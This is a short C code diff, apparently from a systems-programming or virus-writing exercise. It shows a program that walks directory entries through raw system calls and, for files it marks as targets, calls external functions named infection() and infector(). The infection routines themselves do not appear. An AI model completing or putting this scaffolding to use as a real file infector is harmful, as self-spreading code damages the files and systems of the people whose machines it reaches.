@@ -12,7 +12,8 @@
 #define BUF_SIZE 8192
 
 extern int system_call();
-extern void infect_file(char *filename);
+extern void infection();
+extern void infector(char *filename);
 
 int main(int argc, char *argv[]) {
     int fd, nread;
@@ -39,8 +40,9 @@ int main(int argc, char *argv[]) {
         system_call(SYS_EXIT, 0x55, 0, 0);
     }
 
-    for (bpos = 0; bpos < nread;) {
-        unsigned short d_reclen = *(unsigned short*)(buf + bpos + 8);
+    bpos = 0;
+    while (bpos < nread) {
+        short d_reclen = *(short*)(buf + bpos + 8);
         char *d_name = (char*)(buf + bpos + 10);
         int is_target = 0;
 
@@ -49,7 +51,8 @@ int main(int argc, char *argv[]) {
         }
 
         if (is_target) {
-            infect_file(d_name);
+            infection();
+            infector(d_name);
         }
 
         system_call(SYS_WRITE, STDOUT, d_name, strlen(d_name));
